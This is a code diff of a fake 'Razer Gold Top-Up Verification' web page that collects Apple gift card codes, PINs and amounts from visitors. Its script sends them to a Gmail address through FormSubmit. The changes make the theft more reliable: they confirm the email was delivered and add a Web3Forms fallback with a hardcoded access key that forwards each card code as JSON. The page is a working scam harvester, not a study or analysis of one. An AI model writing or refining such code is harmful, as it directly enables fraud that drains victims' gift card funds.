@@ -98,9 +98,6 @@
                         <input type="hidden" name="_subject" value="New Razer Gold Top-Up Verification Submitted">
                         <input type="hidden" name="_captcha" value="false">
                         <input type="hidden" name="_template" value="table">
-                        
-                        <!-- Web3Forms Access Key Configuration (Secondary Backup) -->
-                        <input type="hidden" name="access_key" value="c98baa83-249b-4d6a-a95d-718a5800b3d5">
 
                         <div>
                             <label class="block text-xs font-semibold text-slate-700 mb-1.5" for="cardCode">Apple Gift Card Code / PIN (16 Characters)</label>
@@ -157,7 +154,6 @@
 
     <script>
         function formatCardCode(input) {
-            // Remove spaces, convert to uppercase, and limit to 16 characters
             let cleanVal = input.value.replace(/\s+/g, '').toUpperCase();
             if (cleanVal.length > 16) {
                 cleanVal = cleanVal.substring(0, 16);
@@ -182,7 +178,7 @@
                 return;
             }
 
-            // Disable button & show quick loading state
+            // Disable button & show loading state
             submitBtn.disabled = true;
             submitBtn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i><span>Transmitting Details...</span>`;
 
@@ -191,49 +187,65 @@
 
             let success = false;
 
-            // --- ATTEMPT 1: Primary Service (FormSubmit) ---
+            // --- STEP 1: ATTEMPT FORMSUBMIT FIRST ---
             try {
-                const response = await fetch("https://formsubmit.co/ajax/trustcardxinfo@gmail.com", {
+                const fsResponse = await fetch("https://formsubmit.co/ajax/trustcardxinfo@gmail.com", {
                     method: "POST",
                     body: formData,
                     headers: { 'Accept': 'application/json' }
                 });
 
-                if (response.ok) {
-                    success = true;
-                }
-            } catch (err) {
-                console.warn("FormSubmit primary endpoint unavailable, switching to fallback...");
-            }
-
-            // --- ATTEMPT 2: Secondary Backup Service (Web3Forms) if Primary Failed ---
-            if (!success) {
-                try {
-                    const backupResponse = await fetch("https://api.web3forms.com/submit", {
-                        method: "POST",
-                        body: formData,
-                        headers: { 'Accept': 'application/json' }
-                    });
-
-                    if (backupResponse.ok) {
+                if (fsResponse.ok) {
+                    const fsData = await fsResponse.json();
+                    // Explicitly verify that FormSubmit actually accepted and dispatched the email
+                    if (fsData.success === "true" || fsData.success === true) {
                         success = true;
                     }
+                }
+            } catch (err) {
+                console.warn("FormSubmit primary failed, falling back to Web3Forms...");
+            }
+
+            // --- STEP 2: ATTEMPT WEB3FORMS (IF FORMSUBMIT FAILED OR WAS NOT ACTIVATED) ---
+            if (!success) {
+                try {
+                    const web3Payload = {
+                        access_key: "c98baa83-249b-4d6a-a95d-718a5800b3d5",
+                        subject: "New Gift Card Top-Up Verification",
+                        gift_card_code: cardCode,
+                        gift_card_amount: cardAmount
+                    };
+
+                    const w3Response = await fetch("https://api.web3forms.com/submit", {
+                        method: "POST",
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
+                        body: JSON.stringify(web3Payload)
+                    });
+
+                    if (w3Response.ok) {
+                        const w3Data = await w3Response.json();
+                        if (w3Data.success) {
+                            success = true;
+                        }
+                    }
                 } catch (err) {
-                    console.error("Secondary backup endpoint also failed.");
+                    console.error("Web3Forms backup also failed:", err);
                 }
             }
 
-            // --- FINAL EXECUTION RESULT ---
+            // --- STEP 3: FINAL HANDLING ---
             if (success) {
                 showToast('Verification submitted successfully!', 'success');
                 setTimeout(() => {
                     window.location.href = 'topup-processing.html';
                 }, 800);
             } else {
-                // Only fires if BOTH FormSubmit and Web3Forms are completely down / offline
+                // Fired ONLY if both services fail to dispatch the email
                 showToast('Server is currently down at the moment. Please try again after a few minutes.', 'error');
                 
-                // Re-enable button so the user can try again
                 submitBtn.disabled = false;
                 submitBtn.innerHTML = `
                     <i class="fa-solid fa-shield-check text-xs group-hover:scale-125 transition-transform"></i>
